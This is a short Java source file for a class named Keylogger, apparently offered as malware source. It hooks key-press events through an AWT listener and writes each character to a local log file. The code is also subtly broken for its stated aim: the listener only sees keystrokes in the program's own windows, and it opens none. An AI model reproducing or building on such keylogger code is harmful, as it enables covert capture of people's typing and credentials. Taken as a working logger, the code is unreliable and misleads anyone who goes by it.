import java.awt.AWTEvent;
import java.awt.Toolkit;
import java.awt.event.KeyEvent;
import java.io.FileWriter;
import java.io.IOException;

public class Keylogger implements Runnable {

    private FileWriter logFile;

    public Keylogger(String filename) throws IOException {
        logFile = new FileWriter(filename);
    }

    @Override
    public void run() {
        Toolkit.getDefaultToolkit().addAWTEventListener(event -> {
            if (event instanceof KeyEvent) {
                KeyEvent keyEvent = (KeyEvent) event;
                if (keyEvent.getID() == KeyEvent.KEY_PRESSED) {
                    try {
                        logFile.write(keyEvent.getKeyChar());
                        logFile.flush();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }, AWTEvent.KEY_EVENT_MASK);
    }

    public static void main(String[] args) {
        try {
            Keylogger keylogger = new Keylogger("keylog.txt");
            keylogger.run();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
